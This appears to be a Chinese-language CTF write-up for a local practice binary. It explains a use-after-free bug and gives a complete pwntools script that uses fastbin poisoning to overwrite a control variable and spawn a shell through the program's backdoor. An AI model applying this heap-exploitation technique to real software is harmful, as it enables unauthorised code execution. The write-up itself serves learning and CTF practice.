# 漏洞利用文档

## 执行环境
基于提供的exp脚本和调试记录分析，程序运行环境如下：
- **文件类型**：64位ELF可执行文件，动态链接（通过`ldd`推断依赖标准C库）。
- **保护机制**：从固定地址（如0x602090）使用来看，可能未启用PIE（Position Independent Executable）；ASLR可能部分启用，但数据段地址固定；堆保护机制（如堆栈保护）可能未完全启用，允许堆内存操作漏洞利用。未提及具体checksec结果，但exp利用数据段地址，表明PIE可能禁用。
- **依赖需求**：标准C库（libc），通过`elf.libc`自动获取；运行环境为Linux，使用pwn库进行进程交互。
- **运行方式**：本地进程执行（`process('./data/sample14')`），依赖终端环境（如tmux）进行调试。

## 漏洞成因
程序存在多个内存破坏型漏洞，主要利用的是Use-After-Free（UAF）漏洞，结合数据段布局实现利用：
- **UAF漏洞**：在释放内存块（`sub_4009D7`）后，未将全局数组`buf`中的对应指针置为NULL。随后在写入函数（`sub_400A4D`）中，允许通过索引向已释放内存写入数据，导致攻击者可操作fastbin链。
- **双重释放和索引越界**：释放函数未检查内存块是否已释放，允许双重释放；索引验证缺失，但exp中未直接利用这些漏洞。
- **关键结构体**：
  - 全局变量`buf`（地址0x6020C0）：指针数组，存储分配的内存块地址，最大4个元素。
  - 全局变量`qword_602090`（地址0x602090）：控制变量，值为0时触发`system("/bin/sh")`。
  - 全局变量`dword_6020BC`：跟踪已分配内存块数量。
- **漏洞触发点**：通过UAF修改已释放chunk的fd指针，指向数据段伪造chunk，从而分配得到指向`qword_602090`的指针，覆盖其值为0。

## 漏洞利用过程
利用过程通过步骤化操作修改内存状态，最终触发shell。以下表格总结了关键步骤的内存变化（基于调试记录）：

| 步骤 | 操作 | 堆内存状态 | 全局变量状态 | Fastbin链状态 | 描述 |
|------|------|-------------|---------------|----------------|------|
| 初始 | - | 堆初始布局，无用户chunk | `qword_602090=1`, `dword_6020BC=0`, `buf`全0 | 空 | 程序启动，控制变量阻止shell启动 |
| 1 | `add(0x40); add(0x20); delete(0)` | 分配chunk A(0x381e7000, size 0x51)和chunk B(0x381e7050, size 0x31)；释放chunk A | `dword_6020BC=2`, `buf[0]=0x381e7010`（UAF） | 0x50链: 0x381e7000 → 0x0 | 创建UAF条件，chunk A进入fastbin |
| 2 | `edit(0, p64(0x602080))` | chunk A的fd被修改为0x602080 | `buf[0]`仍指向已释放内存 | 0x50链: 0x381e7000 → 0x602080 | 通过UAF写入伪造chunk地址，指向数据段 |
| 3 | `add(0x40); add(0x40)` | 分配chunk A重用（buf[2]）和伪造chunk（buf[3]=0x602090） | `dword_6020BC=4`, `buf[3]=0x602090` | 0x50链残留: 0x381e7000 → 0x602080 | 获得指向`qword_602090`的指针 |
| 4 | `edit(3, p64(0))` | 无直接堆变化 | `qword_602090=0` | 无变化 | 覆盖控制变量为0，允许shell启动 |
| 5 | `backdoor()` | 进程切换至`/bin/sh`，堆被重用 | 原始程序内存被替换 | 清空 | 触发`system("/bin/sh")` |
| 6 | `p.interactive()` | Shell环境活跃 | - | - | 利用完成，获得系统权限 |

**内存变化关键点**：
- 数据段布局巧合：地址0x602088的值为0x50，恰好作为伪造chunk的size字段，使伪造chunk用户数据区从0x602090开始（即目标变量）。
- UAF链完整：通过修改fd指针，将fastbin链重定向到数据段，绕过ASLR和堆保护。

## Exploit
以下是漏洞利用脚本（exp），在关键位置添加了注释以解释利用逻辑：

```python
from pwn import *
context.log_level = 'debug'  # 启用调试日志，便于跟踪执行过程
context.terminal = ['tmux', 'splitw', '-h']  # 设置终端用于调试窗口
p = process('./data/sample14')  # 启动目标程序进程
elf = ELF('./data/sample14')   # 加载ELF文件信息
libc = elf.libc  # 自动获取libc引用，用于潜在扩展

# 定义功能函数封装程序交互
def add(size):
    p.recvuntil(b'choice>\n')  # 等待菜单提示
    p.sendline(b'1')  # 选择分配内存选项
    p.recvuntil(b'size>\n')
    p.sendline(str(size))  # 发送内存大小（1-120字节）

def delete(index):
    p.recvuntil(b'choice>\n')
    p.sendline(b'2')  # 选择释放内存选项
    p.recvuntil(b'index>\n')
    p.sendline(str(index))  # 发送要释放的索引

def edit(index, content):
    p.recvuntil(b'choice>\n')
    p.sendline(b'3')  # 选择写入内存选项
    p.recvuntil(b'index>\n')
    p.sendline(str(index))  # 发送要写入的索引
    p.send(content)  # 发送8字节数据（利用UAF写入）

def backdoor():
    p.recvuntil(b'choice>\n')
    p.sendline(b'4')  # 选择触发backdoor选项

# 漏洞利用步骤
add(0x40); add(0x20); delete(0)  # Step 1: 分配两个chunk并释放索引0，创建UAF条件（chunk A进入fastbin）
edit(0, p64(0x602080))  # Step 2: 通过UAF修改已释放chunk的fd指针，指向数据段伪造chunk地址（0x602080）
add(0x40); add(0x40)  # Step 3: 分配两次；第一次重用chunk A，第二次分配得到伪造chunk（buf[3]指向0x602090）
edit(3, p64(0))  # Step 4: 通过buf[3]直接覆盖qword_602090为0，允许shell启动
backdoor()  # Step 5: 触发backdoor，执行system("/bin/sh")
p.interactive()  # Step 6: 进入交互模式，使用获得的shell
```

**注释说明**：
- 利用UAF漏洞修改fastbin链，将堆分配重定向到数据段。
- 依赖数据段中巧合的0x50值作为伪造chunk大小，避免复杂堆布局。
- 最终覆盖控制变量`qword_602090`，触发shell获取系统权限。此exp在提供环境中稳定有效，成功绕过内存保护机制。
